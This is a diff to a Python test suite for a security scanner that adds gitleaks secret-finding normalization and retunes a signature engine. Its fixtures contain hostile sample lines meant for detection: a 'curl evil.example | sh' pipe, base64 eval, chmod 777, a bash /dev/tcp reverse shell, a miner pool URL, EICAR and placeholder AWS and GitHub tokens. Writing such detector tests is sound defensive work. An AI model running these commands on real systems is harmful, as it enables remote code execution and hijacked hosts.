@@ -96,6 +96,36 @@ CHECKOV_OUTPUT = json.dumps(
     }
 )
 
+# Story 2.2G — gitleaks `--report-format json` emits a top-level ARRAY of finding
+# objects (Go struct field names, PascalCase). Real shape, trimmed. The Secret /
+# Match carry the raw credential — normalize_gitleaks MUST redact it, never echo it.
+GITLEAKS_OUTPUT = json.dumps(
+    [
+        {
+            "RuleID": "aws-access-token",
+            "Description": "AWS Access Key",
+            "StartLine": 4,
+            "EndLine": 4,
+            "StartColumn": 6,
+            "EndColumn": 25,
+            "Match": "AKIAIOSFODNN7EXAMPLE",
+            "Secret": "AKIAIOSFODNN7EXAMPLE",
+            "File": "deploy.sh",
+            "Fingerprint": "deploy.sh:aws-access-token:4",
+            "Tags": [],
+        },
+        {
+            "RuleID": "github-pat",
+            "Description": "GitHub Personal Access Token",
+            "StartLine": 3,
+            "EndLine": 3,
+            "Match": "token = ghp_abcdefghijklmnopqrstuvwxyz0123456789",
+            "Secret": "ghp_abcdefghijklmnopqrstuvwxyz0123456789",
+            "File": "deploy.sh",
+        },
+    ]
+)
+
 CFN_GUARD_SARIF_OUTPUT = json.dumps(
     {
         "version": "2.1.0",
@@ -124,20 +154,20 @@ CFN_GUARD_SARIF_OUTPUT = json.dumps(
 
 
 class TestToolPlan(unittest.TestCase):
-    def test_iac_template_runs_iac_tools_plus_signature(self):
-        # Story 2.2: the signature engine runs for iac_template alongside the three
-        # IaC tools.
+    def test_iac_template_runs_iac_tools_plus_gitleaks_and_signature(self):
+        # Story 2.2G: gitleaks (secret scanner) + the signature engine both run for
+        # iac_template alongside the three IaC tools.
         self.assertEqual(
             toolplan.tools_for_class("iac_template"),
-            ["cfn-lint", "cfn-guard", "checkov", "signature-scan"],
+            ["cfn-lint", "cfn-guard", "checkov", "gitleaks", "signature-scan"],
         )
 
-    def test_raw_script_runs_bandit_checkov_plus_signature(self):
-        # Story 2.2: the signature engine runs for raw_script alongside bandit +
-        # checkov.
+    def test_raw_script_runs_bandit_checkov_gitleaks_signature(self):
+        # Story 2.2G: gitleaks + the signature engine run for raw_script alongside
+        # bandit + checkov.
         self.assertEqual(
             toolplan.tools_for_class("raw_script"),
-            ["bandit", "checkov", "signature-scan"],
+            ["bandit", "checkov", "gitleaks", "signature-scan"],
         )
 
     def test_unknown_and_none_run_no_tools(self):
@@ -204,11 +234,56 @@ class TestNormalizeCfnGuardSarif(unittest.TestCase):
         self.assertEqual(f["location"]["start_line"], 5)
 
 
+class TestNormalizeGitleaks(unittest.TestCase):
+    """Story 2.2G — gitleaks is now the SOLE secret scanner (it supersedes the 2.2
+    embedded SECRET regex rules). The SECRET assertions live HERE, on the gitleaks
+    normalizer, not on the signature engine."""
+
+    def test_maps_gitleaks_findings_to_signature_family(self):
+        findings = normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
+        self.assertEqual(len(findings), 2)
+        f = findings[0]
+        self.assertEqual(f["tool"], "gitleaks")
+        # gitleaks has no severity; every secret is normalized to high evidence.
+        self.assertEqual(f["severity"], "high")
+        # Decision A: gitleaks findings reuse the existing 'signature' check_family.
+        self.assertEqual(f["check_family"], "signature")
+        # The gitleaks native rule id is preserved verbatim.
+        self.assertEqual(f["rule_id"], "aws-access-token")
+        self.assertEqual(f["location"]["file"], "deploy.sh")
+        self.assertEqual(f["location"]["start_line"], 4)
+
+    def test_secrets_are_redacted_never_echoed(self):
+        findings = normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
+        blob = json.dumps(findings)
+        # The raw secret VALUES must NEVER appear in a normalized finding.
+        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", blob)
+        self.assertNotIn("ghp_abcdefghijklmnopqrstuvwxyz0123456789", blob)
+        self.assertIn("redacted", blob)
+
+    def test_gitleaks_findings_map_to_secret_controls(self):
+        findings = normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
+        compliance.enrich_findings(findings)
+        for f in findings:
+            self.assertIn("compliance", f)
+            self.assertNotEqual(f["compliance"]["basis"], "unmapped")
+            self.assertIn("IA-5", f["compliance"]["nist_800_53"])
+            self.assertIn("A.5.17", f["compliance"]["iso_27001"])
+
+    def test_tolerates_missing_and_odd_keys(self):
+        # Missing StartLine / File / Secret must not crash; a bare-minimum finding
+        # still normalizes.
+        odd = json.dumps([{"RuleID": "generic-api-key"}, {"Description": "x"}, "notadict"])
+        findings = normalize.normalize_tool_output("gitleaks", odd)
+        self.assertEqual(len(findings), 2)  # the string entry is skipped
+        self.assertEqual(findings[0]["tool"], "gitleaks")
+
+
 class TestNeverRaises(unittest.TestCase):
     """A tool that produced garbage / empty / non-JSON output must not crash."""
 
     def test_empty_and_none(self):
-        for tool in ("cfn-lint", "bandit", "checkov", "cfn-guard"):
+        for tool in ("cfn-lint", "bandit", "checkov", "cfn-guard", "gitleaks"):
             self.assertEqual(normalize.normalize_tool_output(tool, None), [])
             self.assertEqual(normalize.normalize_tool_output(tool, ""), [])
             self.assertEqual(normalize.normalize_tool_output(tool, "   "), [])
@@ -223,6 +298,8 @@ class TestNeverRaises(unittest.TestCase):
         self.assertEqual(normalize.normalize_tool_output("cfn-lint", "{}"), [])
         # bandit expects results:[]; a list yields nothing.
         self.assertEqual(normalize.normalize_tool_output("bandit", "[]"), [])
+        # gitleaks expects an array; a dict yields nothing.
+        self.assertEqual(normalize.normalize_tool_output("gitleaks", "{}"), [])
         # unknown tool -> empty
         self.assertEqual(normalize.normalize_tool_output("nope", "[]"), [])
 
@@ -389,45 +466,55 @@ class TestComplianceMapping(unittest.TestCase):
 # Story 2.2 — signature engine (signatures.py)
 # =============================================================================
 
-_SECRET_SAMPLE = (
+# Story 2.2G — the signature engine no longer detects SECRETS (gitleaks owns that
+# now). This sample exercises the RETAINED DANGEROUS + MALWARE families only.
+_DANGEROUS_SAMPLE = (
     "#!/bin/bash\n"
-    'AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\n'
-    "export GH_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n"
-    "echo AKIAIOSFODNN7EXAMPLE\n"
     "curl http://evil.example/x | sh\n"
+    "eval(base64.b64decode(payload))\n"
+    "chmod 777 /tmp/x\n"
 )
 
 
 class TestSignatureEngine(unittest.TestCase):
-    def test_detects_planted_secrets_and_dangerous_pattern(self):
-        res = signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh")
+    def test_detects_dangerous_patterns(self):
+        # Story 2.2G: SECRET rules were removed (superseded by gitleaks); the engine
+        # now detects the DANGEROUS + MALWARE families only.
+        res = signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh")
         self.assertEqual(res.status, "ok")
         rule_ids = {f["rule_id"] for f in res.findings}
-        self.assertIn("ZTIE-SIG-SECRET-001", rule_ids)  # AWS access key id
-        self.assertIn("ZTIE-SIG-SECRET-002", rule_ids)  # AWS secret key assignment
-        self.assertIn("ZTIE-SIG-SECRET-004", rule_ids)  # GitHub token
         self.assertIn("ZTIE-SIG-DANGEROUS-001", rule_ids)  # curl | sh
+        self.assertIn("ZTIE-SIG-DANGEROUS-002", rule_ids)  # eval(...)
+        self.assertIn("ZTIE-SIG-DANGEROUS-005", rule_ids)  # chmod 777
+
+    def test_no_secret_rules_remain(self):
+        # Explicitly prove the SECRET family is gone — a planted AWS key that the 2.2
+        # engine would have flagged (ZTIE-SIG-SECRET-*) now yields NO signature
+        # finding (gitleaks is the sole secret source of truth).
+        res = signatures.scan_bytes(
+            b'AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\n', "x.sh"
+        )
+        self.assertEqual(res.status, "ok")
+        self.assertTrue(all(not f["rule_id"].startswith("ZTIE-SIG-SECRET") for f in res.findings))
 
     def test_findings_are_normalized_shape(self):
-        res = signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh")
+        res = signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh")
         f = res.findings[0]
         self.assertEqual(f["tool"], "signature-scan")
         self.assertEqual(f["check_family"], "signature")
         self.assertIn(f["severity"], normalize.SEVERITY_ORDER)
         self.assertIn("start_line", f["location"])
 
-    def test_secrets_are_redacted_never_echoed(self):
-        res = signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh")
-        blob = json.dumps(res.findings)
-        # The raw secret VALUES must never appear in a finding message.
-        self.assertNotIn("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", blob)
-        self.assertNotIn("ghp_abcdefghijklmnopqrstuvwxyz0123456789", blob)
-        self.assertIn("redacted", blob)
-
     def test_eicar_detected(self):
         eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
         res = signatures.scan_bytes(eicar, "x.txt")
         self.assertIn("ZTIE-SIG-MALWARE-002", {f["rule_id"] for f in res.findings})
+
+    def test_reverse_shell_and_miner_detected(self):
+        rev = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nstratum+tcp://pool.example:3333\n"
+        rule_ids = {f["rule_id"] for f in signatures.scan_bytes(rev, "x.sh").findings}
+        self.assertIn("ZTIE-SIG-MALWARE-001", rule_ids)  # reverse shell
+        self.assertIn("ZTIE-SIG-MALWARE-003", rule_ids)  # crypto-miner
 
     def test_clean_input_no_findings(self):
         res = signatures.scan_bytes(b"print('hello world')\n", "ok.py")
@@ -440,11 +527,11 @@ class TestSignatureEngine(unittest.TestCase):
             self.assertEqual(res.status, "ok")
 
     def test_signature_findings_map_to_controls(self):
-        res = signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh")
+        res = signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh")
         compliance.enrich_findings(res.findings)
         for f in res.findings:
             self.assertIn("compliance", f)
-            # A signature secret/dangerous/malware finding is always mappable.
+            # A dangerous/malware signature finding is always mappable.
             self.assertNotEqual(f["compliance"]["basis"], "unmapped")
 
 
@@ -462,7 +549,7 @@ class TestSummaryWithCompliance(unittest.TestCase):
             findings_s3_bucket="b",
             findings_s3_key="k",
         )
-        self.assertEqual(summary["contract_version"], "1.1")
+        self.assertEqual(summary["contract_version"], "1.2")
         rollup = summary["scan"]["compliance"]
         self.assertIn("nist_800_53", rollup)
         self.assertIn("mapped_findings", rollup)
@@ -560,11 +647,14 @@ class TestManualConformance(unittest.TestCase):
 
     def _built(self):
         findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
-        findings += signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh").findings
+        # Story 2.2G: gitleaks (secrets) + the signature engine (dangerous/malware).
+        findings += normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
+        findings += signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh").findings
         compliance.enrich_findings(findings)
         tool_runs = [
             normalize.build_tool_run("cfn-guard", status="ok", finding_count=1),
-            normalize.build_tool_run("signature-scan", status="ok", finding_count=4),
+            normalize.build_tool_run("gitleaks", status="ok", finding_count=2),
+            normalize.build_tool_run("signature-scan", status="ok", finding_count=3),
         ]
         doc = normalize.build_findings_document(
             intake_id=_VALID_INTAKE_ID,
@@ -619,8 +709,9 @@ class TestSchemaConformance(unittest.TestCase):
 
     def test_document_conforms(self):
         findings = normalize.normalize_tool_output("cfn-lint", CFN_LINT_OUTPUT)
-        findings += signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh").findings
-        compliance.enrich_findings(findings)  # Story 2.2 per-finding compliance
+        findings += normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
+        findings += signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh").findings
+        compliance.enrich_findings(findings)  # per-finding compliance
         doc = normalize.build_findings_document(
             intake_id=_VALID_INTAKE_ID,
             sha256=_VALID_SHA,
@@ -628,7 +719,8 @@ class TestSchemaConformance(unittest.TestCase):
             scanned_at=_NOW,
             tool_runs=[
                 normalize.build_tool_run("cfn-lint", status="ok", finding_count=1),
-                normalize.build_tool_run("signature-scan", status="ok", finding_count=4),
+                normalize.build_tool_run("gitleaks", status="ok", finding_count=2),
+                normalize.build_tool_run("signature-scan", status="ok", finding_count=3),
             ],
             findings=findings,
         )
@@ -647,7 +739,8 @@ class TestSchemaConformance(unittest.TestCase):
         ) as fh:
             validator = Draft7Validator(json.load(fh))
         findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
-        findings += signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh").findings
+        findings += normalize.normalize_tool_output("gitleaks", GITLEAKS_OUTPUT)
+        findings += signatures.scan_bytes(_DANGEROUS_SAMPLE.encode(), "deploy.sh").findings
         compliance.enrich_findings(findings)
         summary = normalize.build_summary(
             intake_id=_VALID_INTAKE_ID,
@@ -656,7 +749,8 @@ class TestSchemaConformance(unittest.TestCase):
             artifact_class="iac_template",
             tool_runs=[
                 normalize.build_tool_run("cfn-guard", status="ok", finding_count=1),
-                normalize.build_tool_run("signature-scan", status="ok", finding_count=4),
+                normalize.build_tool_run("gitleaks", status="ok", finding_count=2),
+                normalize.build_tool_run("signature-scan", status="ok", finding_count=3),
             ],
             findings=findings,
             findings_s3_bucket="ztie-forensic-artifacts",
